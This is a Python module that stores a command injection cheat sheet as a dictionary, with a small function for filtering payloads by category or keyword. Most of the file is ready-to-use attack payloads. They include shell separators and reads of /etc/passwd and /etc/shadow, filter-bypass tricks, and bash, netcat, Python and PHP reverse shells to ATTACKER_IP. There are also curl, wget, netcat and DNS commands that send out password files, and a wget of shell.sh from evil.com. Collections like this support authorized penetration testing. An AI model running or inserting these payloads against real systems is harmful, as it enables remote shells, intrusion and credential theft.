"""Command Injection cheat sheet."""

CMDI_CHEATSHEET = {
    "title": "Command Injection Cheat Sheet",
    "categories": {
        "basic_payloads": {
            "title": "Basic Command Injection",
            "description": "Simple payloads to test for command injection",
            "payloads": [
                {"payload": "; ls", "description": "Semicolon separator"},
                {"payload": "| ls", "description": "Pipe operator"},
                {"payload": "& ls", "description": "Background operator"},
                {"payload": "|| ls", "description": "OR operator"},
                {"payload": "&& ls", "description": "AND operator"},
                {"payload": "`ls`", "description": "Backtick execution"},
                {"payload": "$(ls)", "description": "Command substitution"},
                {"payload": "\nls", "description": "Newline separator"},
                {"payload": "; id", "description": "Check current user"},
                {"payload": "; whoami", "description": "Get username"},
            ],
        },

        "linux_commands": {
            "title": "Linux Specific",
            "description": "Linux command injection payloads",
            "payloads": [
                {"payload": "; cat /etc/passwd", "description": "Read passwd file"},
                {"payload": "; cat /etc/shadow", "description": "Read shadow file"},
                {"payload": "; ls -la /", "description": "List root directory"},
                {"payload": "; uname -a", "description": "System info"},
                {"payload": "; id", "description": "User & group IDs"},
                {"payload": "; pwd", "description": "Current directory"},
                {"payload": "; env", "description": "Environment variables"},
                {"payload": "; netstat -an", "description": "Network connections"},
                {"payload": "; ps aux", "description": "Running processes"},
                {"payload": "; curl http://evil.com", "description": "External request"},
                {"payload": "; wget http://evil.com/shell.sh", "description": "Download file"},
            ],
        },

        "windows_commands": {
            "title": "Windows Specific",
            "description": "Windows command injection payloads",
            "payloads": [
                {"payload": "& dir", "description": "Directory listing"},
                {"payload": "& type C:\\Windows\\win.ini", "description": "Read file"},
                {"payload": "& whoami", "description": "Current user"},
                {"payload": "& hostname", "description": "Computer name"},
                {"payload": "& ipconfig", "description": "Network config"},
                {"payload": "& systeminfo", "description": "System info"},
                {"payload": "& net user", "description": "List users"},
                {"payload": "& tasklist", "description": "Running processes"},
                {"payload": "| powershell -c \"whoami\"", "description": "PowerShell command"},
            ],
        },

        "blind_injection": {
            "title": "Blind Command Injection",
            "description": "Detect command injection without output",
            "payloads": [
                {"payload": "; sleep 5", "description": "Time delay (Linux)"},
                {"payload": "| sleep 5", "description": "Pipe + sleep"},
                {"payload": "& ping -c 5 127.0.0.1", "description": "Ping delay (Linux)"},
                {"payload": "& ping -n 5 127.0.0.1", "description": "Ping delay (Windows)"},
                {"payload": "; curl http://your-server.com", "description": "Out-of-band (curl)"},
                {"payload": "; wget http://your-server.com", "description": "Out-of-band (wget)"},
                {"payload": "; nslookup your-server.com", "description": "DNS lookup"},
                {"payload": "| nslookup $(whoami).your-server.com", "description": "DNS exfiltration"},
            ],
        },

        "filter_bypass": {
            "title": "Filter Bypass",
            "description": "Bypass command injection filters",
            "payloads": [
                {"payload": ";l$()s", "description": "Empty variable"},
                {"payload": ";l${IFS}s", "description": "IFS (space) bypass"},
                {"payload": ";{ls,}", "description": "Brace expansion"},
                {"payload": ";$'ls'", "description": "ANSI-C quoting"},
                {"payload": ";l\\s", "description": "Backslash in command"},
                {"payload": ";l''s", "description": "Empty quotes"},
                {"payload": ";/???/??t /???/p??s??", "description": "Wildcard bypass"},
                {"payload": ";$(echo bHM= | base64 -d)", "description": "Base64 encoded"},
                {"payload": ";`echo bHM= | base64 -d`", "description": "Base64 with backticks"},
                {"payload": "%0als", "description": "URL-encoded newline"},
            ],
        },

        "reverse_shells": {
            "title": "Reverse Shell Payloads",
            "description": "Payloads to get reverse shell (replace IP/PORT)",
            "payloads": [
                {"payload": "; bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1", "description": "Bash reverse shell"},
                {"payload": "; nc -e /bin/sh ATTACKER_IP PORT", "description": "Netcat reverse shell"},
                {"payload": "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f", "description": "Netcat (no -e)"},
                {"payload": "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "description": "Python reverse shell"},
                {"payload": "; php -r '$sock=fsockopen(\"ATTACKER_IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "description": "PHP reverse shell"},
            ],
        },

        "data_exfiltration": {
            "title": "Data Exfiltration",
            "description": "Extract data via command injection",
            "payloads": [
                {"payload": "; cat /etc/passwd | nc ATTACKER_IP PORT", "description": "Netcat exfil"},
                {"payload": "; curl http://ATTACKER_IP/?data=$(cat /etc/passwd | base64)", "description": "HTTP exfil"},
                {"payload": "; wget http://ATTACKER_IP/$(whoami)", "description": "Filename exfil"},
                {"payload": "| nslookup $(cat /etc/passwd | base64).ATTACKER_DOMAIN", "description": "DNS exfil"},
            ],
        },

        "argument_injection": {
            "title": "Argument Injection",
            "description": "Inject arguments to legitimate commands",
            "payloads": [
                {"payload": "--help", "description": "Show help"},
                {"payload": "-v", "description": "Verbose output"},
                {"payload": "--version", "description": "Show version"},
                {"payload": "-o output.txt", "description": "Output to file"},
                {"payload": "file.txt; cat /etc/passwd", "description": "Filename + command"},
                {"payload": "$(touch pwned)", "description": "Command in argument"},
            ],
        },
    },
}


def get_cheatsheet(category: str = None, filter_keyword: str = None) -> dict:
    """
    Get command injection cheatsheet.

    Args:
        category: Specific category to return
        filter_keyword: Filter payloads containing keyword

    Returns:
        Cheatsheet dictionary
    """
    if category and category in CMDI_CHEATSHEET["categories"]:
        result = {
            "title": CMDI_CHEATSHEET["title"],
            "categories": {category: CMDI_CHEATSHEET["categories"][category]},
        }
    else:
        result = CMDI_CHEATSHEET

    if filter_keyword:
        filtered_categories = {}
        for cat_name, cat_data in result["categories"].items():
            filtered_payloads = [
                p for p in cat_data["payloads"]
                if filter_keyword.lower() in p["payload"].lower()
                or filter_keyword.lower() in p["description"].lower()
            ]
            if filtered_payloads:
                filtered_categories[cat_name] = {
                    **cat_data,
                    "payloads": filtered_payloads,
                }
        result["categories"] = filtered_categories

    return result
